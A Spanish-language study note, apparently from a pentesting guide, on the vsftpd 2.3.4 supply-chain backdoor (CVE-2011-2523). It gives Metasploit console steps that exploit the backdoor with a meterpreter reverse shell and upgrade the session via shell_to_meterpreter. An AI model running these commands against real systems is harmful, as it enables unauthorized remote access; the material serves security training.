# vsftpd 2.3.4 Backdoor

Uno de los servidores FTP más conocidos en sistemas Linux es **vsftpd (Very Secure FTP Daemon)**, que ha sido ampliamente utilizado en distribuciones como Ubuntu, CentOS y Fedora.

Sin embargo, la versión vsftpd 2.3.4 es conocida por estar asociada a la vulnerabilidad **CVE-2011-2523**, un caso histórico de ataque a la cadena de suministro. En este incidente, el archivo de distribución del software fue comprometido y se introdujo una backdoor en el binario distribuido. Como resultado, sistemas que instalaban esta versión podían quedar expuestos a acceso no autorizado y posible ejecución remota de comandos.

Este caso demuestra que una vulnerabilidad no siempre proviene de un fallo en el código o en la configuración, sino que puede originarse en la propia cadena de distribución del software. Por ello, la verificación de integridad de paquetes y la procedencia del software son aspectos críticos en la seguridad de sistemas.

### Explotación con MSF

```bash
msf > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution
msf > use 1
[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
msf exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts ip
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
```

Para convertir la sesión a meterpreter podemos poner la conexión en pausa (ctrl+z) y usar el módulo `shell_to_meterpreter`.

```bash
msf > use post/multi/manage/shell_to_meterpreter
msf post(multi/manage/shell_to_meterpreter) > set lhost ip_kali
msf post(multi/manage/shell_to_meterpreter) > set session id_bash
msf post(multi/manage/shell_to_meterpreter) > run
```

Esto crea la sesión meterpreter, pero no la abre. Para conectarnos a ella usamos `session id_meterpreter`.

[⟵ Anterior](../05_sistema.md#explotación-windows)
